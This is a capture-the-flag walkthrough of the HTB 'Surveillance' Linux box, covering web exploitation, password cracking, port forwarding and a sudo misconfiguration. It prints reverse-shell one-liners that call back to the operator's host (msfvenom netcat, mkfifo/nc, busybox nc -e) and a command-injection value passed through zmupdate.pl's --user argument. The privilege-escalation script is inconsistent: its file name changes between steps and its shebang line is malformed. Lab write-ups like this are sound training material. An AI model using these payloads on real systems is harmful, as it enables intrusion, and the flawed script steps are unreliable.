---
layout: writeup
title: "Surveillance"
date: 2026-06-16
description: "Walkthrough of HTB Surveillance, a Medium Linux machine."
tags: [Box, medium, linux]
---

## Reconnaissance

The assessment began with a full Nmap scan to identify open ports and running services on the target host.

```bash
nmap -Pn -sC -sV -p- --open <IP> -oN scan.txt
```

The scan shows ports 22 and 80 open, running OpenSSH 8.9p1 and nginx 1.18.0 respectively. Since the website does not resolve by default, the domain is added to the **/etc/hosts** file to reach it.

![Ports 22 and 80 open on the target](/assets/images/surveillance/35-1.png)
*Ports 22 and 80 open on the target*

## Enumeration / Analysis

With the website accessible, directory enumeration is performed to discover hidden endpoints, authentication panels, or other interesting resources.

```bash
gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirb/big.txt
```

Enumeration surfaces the **/admin/login** directory. Inspecting the page source reveals a reference to a public GitHub repository, which provides valuable information about the application in use.

![During enumeration, identifying the /admin/login directory](/assets/images/surveillance/35-2.png)
*During enumeration, identifying the /admin/login directory*

The repository and version information point to a known vulnerability, CVE-2023-41892, which allows remote code execution under certain conditions.

## Exploitation

Exploiting CVE-2023-41892 achieves remote code execution on the target and returns an initial reverse shell.

![Initial reverse shell from exploiting CVE-2023-41892](/assets/images/surveillance/35-3.png)
*Initial reverse shell from exploiting CVE-2023-41892*

To improve stability, a more reliable reverse-shell payload is generated with msfvenom.

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=<IP> LPORT=<PORT> R
```

The generated payload provides a command that is run on the target to establish the connection.

```bash
mkfifo /tmp/ypev; nc <IP> <PORT> 0</tmp/ypev | /bin/sh >/tmp/ypev 2>&1; rm /tmp/ypev
```

Once connected, the shell is upgraded with Python to obtain a fully interactive TTY.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

At this point, two local users are identified: **matthew** and **zoneminder**. Exploring the filesystem locates a file that appears to hold sensitive information.

![At this point, identifying two local users on the system: matthew and zoneminder](/assets/images/surveillance/35-4.png)
*At this point, identifying two local users on the system: matthew and zoneminder*

This file is transferred to the local machine for further analysis.

![Transferring this file to the local machine for further analysis](/assets/images/surveillance/35-5.png)
*Transferring this file to the local machine for further analysis*

![Transferring this file to the local machine for further analysis](/assets/images/surveillance/35-6.png)
*Transferring this file to the local machine for further analysis*

Inspecting the SQL content and searching for the previously identified users locates credential-related data.

![Credential data located in the SQL content](/assets/images/surveillance/35-7.png)
*Credential data located in the SQL content*

A password hash is extracted, and hash-identification techniques determine its format. Cracking it recovers the password for the **matthew** user.

These credentials establish an SSH connection as matthew for a stable, persistent shell.

![Using these credentials, establishing an SSH connection as matthew to gain a stable and persistent shell](/assets/images/surveillance/35-8.png)
*Using these credentials, establishing an SSH connection as matthew to gain a stable and persistent shell*

Inside matthew’s home directory is the **user.txt** flag. Further exploration surfaces references to an application named **ZoneMinder**.

![Inside matthew’s home directory, retrieving the user.txt flag](/assets/images/surveillance/35-9.png)
*Inside matthew’s home directory, retrieving the user.txt flag*

Additional checks reveal that ZoneMinder is running on a different port, not directly accessible from the machine.

![ZoneMinder bound to an internal-only port](/assets/images/surveillance/35-10.png)
*ZoneMinder bound to an internal-only port*

To reach this service, an SSH port-forwarding tunnel is created through the compromised host.

```bash
ssh -L 4444:127.0.0.1:8080 matthew@surveillance.htb
```

This allows the operator to access the ZoneMinder web interface locally.

![This allows the operator to access the ZoneMinder web interface locally](/assets/images/surveillance/35-11.png)
*This allows the operator to access the ZoneMinder web interface locally*

The application interface reveals the exact version of ZoneMinder in use, which guides the search for known vulnerabilities.

![Identifying the ZoneMinder version in use](/assets/images/surveillance/35-12.png)
*Identifying the ZoneMinder version in use*

CVE-2023-26035 stands out as a path to remote code execution. Exploiting it returns another reverse shell, this time with higher privileges.

![Identifying CVE-2023-26035, which can be exploited to achieve remote code execution](/assets/images/surveillance/35-13.png)
*Identifying CVE-2023-26035, which can be exploited to achieve remote code execution*

## Privilege Escalation

Running **sudo -l** reveals that it is possible to execute a specific ZoneMinder-related command as root.

![Running sudo -l reveals that it is possible to execute a specific ZoneMinder-related command as root](/assets/images/surveillance/35-14.png)
*Running sudo -l reveals that it is possible to execute a specific ZoneMinder-related command as root*

To leverage this misconfiguration, a malicious script that initiates a reverse shell is created in the **/tmp** directory.

```bash
echo '#!/bin/bash busybox nc <IP> <PORT> -e sh' > myscript.sh
```

After the script is transferred to the target and given execute permissions, the vulnerable command is run in a way that triggers the payload with root privileges.

```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/reverse.sh)' --pass=ZoneMinderPassword2023
```

This yields a root shell, which exposes the **root.txt** flag and completes the machine.
